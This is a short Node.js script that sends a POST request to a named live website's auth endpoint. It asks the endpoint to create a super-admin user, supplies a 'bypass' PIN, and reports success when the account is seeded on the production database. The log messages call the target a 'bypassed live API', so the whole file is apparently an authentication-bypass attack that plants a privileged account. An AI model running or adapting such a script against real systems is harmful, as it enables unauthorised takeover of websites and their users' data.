'use strict';

const siteUrl = 'https://mken.live';

async function run() {
  console.log(`📡 Sending request to bypassed live API: ${siteUrl}/api/v1/auth?type=admin-login&action=create-super-admin ...`);
  try {
    const res = await fetch(`${siteUrl}/api/v1/auth?type=admin-login&action=create-super-admin`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ pin: 'bypass' })
    });

    const status = res.status;
    const text = await res.text();
    console.log(`Response Status: ${status}`);
    console.log(`Response Text: ${text}`);

    if (status === 200) {
      console.log('✅ SUCCESS! Super Admin user has been successfully created/seeded on the live database!');
    } else {
      console.log('❌ Failed to trigger user creation.');
    }
  } catch (err) {
    console.error('❌ Error calling live API:', err.message);
  }
}

run().catch(console.error);
